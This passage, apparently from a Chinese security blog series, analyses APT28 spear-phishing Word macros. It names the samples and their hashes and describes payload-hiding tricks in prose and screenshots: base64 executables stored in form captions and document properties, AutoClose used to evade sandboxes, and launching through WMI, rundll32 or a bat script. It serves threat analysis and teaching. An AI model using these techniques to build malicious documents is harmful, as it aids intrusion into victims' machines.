![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BfP9ZHiazU1QuA0TVY7HpKdfyx2Db5uzic2y3Ev30NrVbib926rQjbTdoA/640?wx_fmt=png)

通过宏代码分析，发现其没有进行混淆工作，但是这次使用 AutoClose，只有文档关闭的时候，恶意代码才会执行。从而会绕过一些不关闭文档的沙箱检测。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BYcmeL7LYP2Jz5aaoibhRHibzlmHhemtiawt6Ux0UZIWFErFjnYyV37MxA/640?wx_fmt=png)

此次宏文件一共会创建两个文件，如下所示，分别是从 UserForm1.Label2.Caption 和 UserForm1.Label1.Caption 中提取出来使用 base64 编码的恶意文件。

*   Environ(“APPDATA”) “\MSDN” “~msdn”
    
*   Environ(“TEMP”) “~temp.docm”
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BE6Wyqn3UoFGtkGYiclrXEXmjU0aqEXhHzGicDicVRjXnWlruiar1hUzwQA/640?wx_fmt=png)

选择 UserForm1 窗体右键保存后，可以看到里面经过 base64 编码的恶意文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BZl9YQAqkvzibTUH3SBXBjKeANGDlOuRNl8kZ3iaPKtBg4MPZ0nQoBUBQ/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BrlXcsZ8loAO5FF51YAL0ErEJXakj5f1FtCG0eoLvkR1DwPAMA5HYZg/640?wx_fmt=png)

将 msdn 和 temp.docm 写入后开始加载 temp.docm，再运行 temp.docm 的 Module1.Proc1。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BibicGHFF8WMeojj8oHicokdC3PDeg9hUBoUjDM1ksxEDYTH8qKECQBwKg/640?wx_fmt=png)

最后可以看到通过 shell 运行释放 exe。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4B6PDsQ5kyCjibd3rfcAQnRvWFLaJnn3emLWhFwic1OkhFIRziaZeWPsrYw/640?wx_fmt=png)

2. 酒店行业鱼叉邮件
-----------

*   文件名称：Hotel_Reservation_Form.doc
    
*   SHA-256 a4a455db9f297e2b9fe99d63c9d31e827efb2cda65be445625fa64f4fce7f797
    
*   创建时间：2017:07:03 05:33:00Z
    
*   文件大小：76.7 KB (78,600 字节)
    
*   基本方法  
    针对特定的攻击目标对内容进行了定制化处理，样本使用 WMI 调用  
    rundll32.exe 启动。
    

首先，样本运行完如下，可以看到针对特定的攻击目标对内容进行了特定的定制化。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4Bsf3klP4ibq9aicXt9l5spueLiaCor7wRMWbhFd7SVVutibiaMobcMiblKGmg/640?wx_fmt=png)

分析宏代码，发现宏代码是加密过的。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BGKHh5icEhaMPia1GUrZuKJbA3fvKI4Uian8VlOP3Ntt7dj1x44rebPOuA/640?wx_fmt=png)

解密可以看到三个函数，攻击者并没有做太多的混淆，而是将关键的 PE 文件 BASE64 编码放到 XML 文件中，包括：

*   AutoOpen()
    
*   DecodeBase64(base64)
    
*   Execute()
    

获取指定 xml 节点的信息。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BWPwd2kEyXRCY1C5ibQic3zaAib6HdeqvRx5Yd4b3sjow6lh1y9lFribLjQ/640?wx_fmt=png)

最后在 docProps/app.xml 中发现了这个 base64 编码的文本。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4B7vgWTbfq12rs54GibNmpdYPgibKhTCXn5YSrrXGUCm4FTWicCsbKjVDUQ/640?wx_fmt=png)

之后将 base64 文本文件解码。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BBx4ohTnDP2UO5sn5OtbFqElWt9dIWQWjPeAKCFunHeXbE2KLbK2pvg/640?wx_fmt=png)

解密后为一个 PE 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BRZPgWrgjINRrLic6jiaSJlmzOZGyl3lQBaUYJOsVRmiaZArm2VtnQEk1w/640?wx_fmt=png)

发现将样本放到 APPDATA 环境变量的目录下，文件名为 user.dat，最后使用了 WMI 调用 rundll32.exe 启动。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4Bt8Tv8Mibkup4CAUtujsv9UW0GApMrb4OVZ4IjhnR1TZMVMS1laQib2yw/640?wx_fmt=png)

3. 研究机构鱼叉邮件
-----------

*   文件名称：Conference_on_Cyber_Conflict.doc
    
*   SHA-256 e5511b22245e26a003923ba476d7c36029939b2d1936e17a9b35b396467179ae
    
*   创建时间：2017:10:03 01:36:00
    
*   文件大小：333 KB (341,504 字节)
    
*   基本方法  
    针对特定的攻击目标对内容进行了定制化处理，样本 base64 解码，设置 bat 脚本并启动。
    

样本运行完如下，可以看到针对特定的攻击目标对内容进行了特定的定制化。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BiaJLSpCdzbcodc9OdibTNeydMeqQZf0du3IvKKlCxNicALdicg0ndduvAw/640?wx_fmt=png)

对宏代码进行了加密，解密可以看到三个函数，攻击者并没有做太多的混淆，而是将关键的可执行文件分散放编码放到文件属性中。

*   AutoOpen()
    
*   DecodeBase64(base64)
    
*   Execute()
    

将 base64 数据放到了 word 的内置属性中。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BpPZdbZn0yZBq4md221aTgib78eUr8tpK5vvMyGTGBaAiawmTHSdkib0mQ/640?wx_fmt=png)

合并获取的编码值并解码。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BjoT6Cxe5fWGIKvyNUzvNAgNNDqpubCn661iatAicLa3tOXccujI8kGIA/640?wx_fmt=png)

最后设置 bat 脚本，然后启动

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4By1p4iaFz3SO1AowycCRgiaXKamnllZYwm9cwnXt5I7ay7mdsqDCcI0rw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BkQUgkCEJdX6iafC5k2xhLRLQcPH2wQ1SIibjDJrGdKPQcRSokiahnRr6g/640?wx_fmt=png)

七. 总结
=====

写到这里，这篇宏病毒基础性文章就介绍结束了，包括入门基础、防御措施、自发邮件及 APT28 样本分析，希望对您有所帮助。后续作者还会继续深入分析宏病毒，并结合实例和防御进行讲解。作者作为网络安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，感谢小伙伴和师傅们的教导，深知自己很菜，得努力前行。

*   **一. 什么是宏**
    
    1. 基础概念
    
    2. 安装配置
    
    3. 录制新宏案例
    
*   **二. 宏病毒**
    
    1. 宏病毒基础
    
    2. 自动宏案例
    
    3. 宏病毒感染
    
*   **三. 宏病毒的自我保护与防御**
    
*   **四. 案例：CDO 自发邮箱**
    
*   **五. 案例：QQ 发送信息**
    
*   **六. APT28 攻击中的宏病毒**
    
    1.OZ 鱼叉邮件
    
    2. 酒店行业鱼叉邮件
    
    3. 研究机构鱼叉邮件
    

学安全一年，认识了很多安全大佬和朋友，希望大家一起进步。这篇文章中如果存在一些不足，还请海涵。作者作为网络安全和系统安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，感谢师傅、实验室小伙伴的教导，深知自己很菜，得努力前行。编程没有捷径，逆向也没有捷径，它们都是搬砖活，少琢磨技巧，干就对了。什么时候你把攻击对手按在地上摩擦，你就赢了，也会慢慢形成了自己的安全经验和技巧。加油吧，少年希望这个路线对你有所帮助，共勉。

前文回顾（下面的超链接可以点击喔）：

*   [[系统安全] 一. 什么是逆向分析、逆向分析应用及经典扫雷游戏逆向](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484670&idx=1&sn=c31b15b73f27a7ce44ae1350e7f708a2&chksm=cfccb433f8bb3d25c25f044caac29d358fe686602011d8e4cbdc504e3a587e756215ce051819&scene=21#wechat_redirect)
    
*   [[系统安全] 二. 如何学好逆向分析及吕布传游戏逆向案例](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484756&idx=1&sn=ef95ff95474c51fa2bd4b9b4847ebb54&chksm=cfccb599f8bb3c8fa4852416cff6695fc8dcc9aadb3295c7249c12c03cad4c146a93e6250d56&scene=21#wechat_redirect)
    
*   [[系统安全] 三. IDA Pro 反汇编工具初识及逆向工程解密实战](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484812&idx=1&sn=9b77853a5b9da0f7a688e592dba3ddba&chksm=cfccb541f8bb3c57faffc7661a452238debe09cc7a57ae2d9e9d835d6520ee441bfd9d5ad119&scene=21#wechat_redirect)
    
*   [[系统安全] 四. OllyDbg 动态分析工具基础用法及 Crakeme 逆向破解](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484950&idx=1&sn=07d8f0b20f599586ef06035354b14630&chksm=cfccb6dbf8bb3fcd6d2efcc7b6757fabd8015d86f43e3bc8ae6cb9367d19492aec881374fca2&scene=21#wechat_redirect)
    
*   [[系统安全] 五. OllyDbg 和 Cheat Engine 工具逆向分析植物大战僵尸游戏](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485043&idx=1&sn=028c702990f722d087c6c349fb34f5fb&chksm=cfccb6bef8bb3fa8882994f7412db6b769d382abbafa6b5b3bd1b5ae62dffa20e81c7170ecb4&scene=21#wechat_redirect)
    
*   [[系统安全] 六. 逆向分析之条件语句和循环语句源码还原及流程控制](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485936&idx=1&sn=b1c282021280bb24646a9bf7c0f1fa6a&chksm=cfccb93df8bb302b51ae1026dba4f8839a1c68690df0e8da3242e9c1ead0182bf6c34dd44ada&scene=21#wechat_redirect)
    
*   [[系统安全] 七. 逆向分析之 PE 病毒原理、C++ 实现文件加解密及 OllyDbg 逆向](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485996&idx=1&sn=d5e323f16ce0b3d88c678a1fc1848596&chksm=cfccbae1f8bb33f7fad687d17ba7c10312bf2d756e460217a5d60ef2af0c012336292918128d&scene=21#wechat_redirect)
    
*   [[系统安全] 八. Windows 漏洞利用之 CVE-2019-0708 复现及蓝屏攻击](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486024&idx=1&sn=102ace20c2b15f4e7a9f910b56b84aec&chksm=cfccba85f8bb33939ac7e99cae23d1b6da5a0db4e6ff8bc7535a77a46a4204855de41aa446dd&scene=21#wechat_redirect)
    
*   [[系统安全] 九. Windows 漏洞利用之 MS08-067 远程代码执行漏洞复现及深度提权](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486057&idx=1&sn=7e7899b9285ac04f0d9745b4c455b005&chksm=cfccbaa4f8bb33b25ffcd780764ad86dc63edc7dd56d09e466254f6277851b5a4a545bb209a4&scene=21#wechat_redirect)
    
*   [[系统安全] 十. Windows 漏洞利用之 SMBv3 服务远程代码执行漏洞（CVE-2020-0796）复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486111&idx=1&sn=e2129fc8efa79d2356c3a2deec6d52a1&chksm=cfccba52f8bb3344479fa8d201494f88ac1b0cee3e0786797dd09a17c5f4aa4a5627fd0afef0&scene=21#wechat_redirect)
    
*   [[系统安全] 十一. 那些年的熊猫烧香及 PE 病毒行为机理分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486188&idx=1&sn=34a1d3f2d6880dfd60917b84d3efaa5a&chksm=cfccba21f8bb3337b45cc0fb98af3ab6a1333219fe2a06d3c3c8e38b996e1039e5b0f8d14f24&scene=21#wechat_redirect)
    
*   [[系统安全] 十二. 熊猫烧香病毒 IDA 和 OD 逆向分析（上）病毒初始化](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486260&idx=1&sn=0760360d286782209e9f93d37c177c73&chksm=cfccbbf9f8bb32ef5e54058ded6072a248e3156be64213a238b47b5fa65b6909889ab0c9b7c5&scene=21#wechat_redirect)
    
*   [[系统安全] 十三. 熊猫烧香病毒 IDA 和 OD 逆向分析（中）病毒释放机理](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486423&idx=1&sn=43f77342f8900b481eaa536b9e81f737&chksm=cfccbb1af8bb320ccc6f1bd93e358b916ccb6313f9bbdcf1d9c31deebf16a2e643ce0e121113&scene=21#wechat_redirect)
    
*   [[系统安全] 十四. 熊猫烧香病毒 IDA 和 OD 逆向分析（下）病毒感染配置](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486580&idx=1&sn=20b672097bf0be1fbdf5952bb53b23a6&chksm=cfccbcb9f8bb35affbc611fc92875f9250060914d94fa1d9a7c2b9e9482fd4a50bbb33ebc42f&scene=21#wechat_redirect)
    
*   [[系统安全] 十五. Chrome 密码保存功能渗透解析、Chrome 蓝屏漏洞及音乐软件漏洞复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486662&idx=1&sn=6506a733804564137d40c7c070287590&chksm=cfccbc0bf8bb351d1a82737e5dc310c048f80fb5fcfe3317c7bc1b38ac6b52de60923cb92ba7&scene=21#wechat_redirect)
    
*   [[系统安全] 十六. PE 文件逆向基础知识 (PE 解析、PE 编辑工具和 PE 修改)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486866&idx=1&sn=cd3bc433c0a6a7b1f8bcaa4295cf65ae&chksm=cfccbd5ff8bb34496b9dc20b2fd304ce1d1194fd076902127a6817362b3c52afc056126ca0ba&scene=21#wechat_redirect)
    
*   [[系统安全] 十七. Windows PE 病毒概念、分类及感染方式详解](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247487219&idx=1&sn=1e123c330cb0499400d5529cbd5f47f3&chksm=cfccbe3ef8bb3728118a0aab982a56b3ea66f320a221c6a318263104a35f5aee8d3545612683&scene=21#wechat_redirect)
    
*   [[系统安全] 十八. 病毒攻防机理及 WinRAR 恶意劫持漏洞 (bat 病毒、自启动、蓝屏攻击)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247487311&idx=1&sn=95211524641975c5a5093f07df5e6ab2&chksm=cfccbf82f8bb36940f26a26bd8ed5870088823a9a97ccd81e699ed82aca3f579231c9b3e987e&scene=21#wechat_redirect)
    
*   [系统安全] 十九. 宏病毒之入门基础、防御措施、自发邮件及 APT28 宏样本分析  
    

2020 年 8 月 18 新开的 “娜璋 AI 安全之家”，主要围绕 Python 大数据分析、网络空间安全、人工智能、Web 渗透及攻防技术进行讲解，同时分享 CCF、SCI、南核北核论文的算法实现。娜璋之家会更加系统，并重构作者的所有文章，从零讲解 Python 和安全，写了近十年文章，真心想把自己所学所感所做分享出来，还请各位多多指教，真诚邀请您的关注！谢谢。2021 年继续加油！

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZePZ27y7oibNu4BGibRAq4HydK4JWeQXtQMKibpFEkxNKClkDoicWRC06FHBp99ePyoKPGkOdPDezhg/640?wx_fmt=png)

(By:Eastmount 2021-02-03 周三夜于 1 点)

参考文献：

*   [1] 小伙伴们的分享、《软件安全》课程实验（详见网易云课程 WHU）
    
*   [2] 宏的基本概念与使用 - WHU MOOC
    
*   [3] 宏病毒 + 使用 CDO 自动发邮件 - 良月廿七
    
*   [4] word 宏病毒通过邮件获取路径和文件名 - Braylon1002
    
*   [5] 宏 & 一个简单的宏病毒示例 - Erio
    
*   [6] PoetRAT: Python RAT uses COVID-19 lures to target Azerbaijan public and private sectors
    
*   [7] APT28 样本分析之宏病毒分析 - 先知社区
    
*   [8] 宏病毒研究 2——实战研究篇 - i 春秋老师 icq5f7a075d
    
*   [9] [Office] WPS Excel 通过添加宏实现多张表格合并
    
*   [11]https://www.fireeye.com/blog/threat-research/
    
    2017/08/apt28-targets-hospitality-sector.html